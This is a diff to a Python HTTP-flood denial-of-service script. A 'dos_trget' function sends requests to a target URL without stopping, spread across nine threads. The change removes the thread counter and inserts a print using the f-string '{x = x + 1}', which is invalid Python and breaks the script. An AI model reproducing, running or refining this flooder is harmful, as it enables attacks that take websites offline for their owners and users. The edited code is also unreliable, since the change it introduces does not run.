@@ -29,6 +29,7 @@ except:
     exit("missing lib: time")
 #
 op_sy = sys.platform
+x = 0 
 #
 def clear():
     if op_sy == ("linux"):
@@ -41,7 +42,7 @@ def dos_trget(target):
     while True:
         try:
             rves = requests.get(target)
-            print("Request sented")
+            print(f"Request sented to {x = x + 1}")
 #
         except requests.exceptions.ConnectionError:
             print("Check internet connection")
@@ -99,20 +100,12 @@ while True:
         thr_8 = threading.Thread(target=dos_trget, args=(http_url,))
 #
         thr.start()
-        i = i + 1
         thr_1.start()
-        i = i + 1
         thr_2.start()
-        i = i + 1
         thr_3.start()
-        i = i + 1
         thr_4.start()
-        i = i + 1
         thr_5.start()
-        i = i + 1
         thr_6.start()
-        i = i + 1
         thr_7.start()
-        i = i + 1
         thr_8.start()
-        print(f"threads send: {str(i + 1)} to {http_url}")
+        
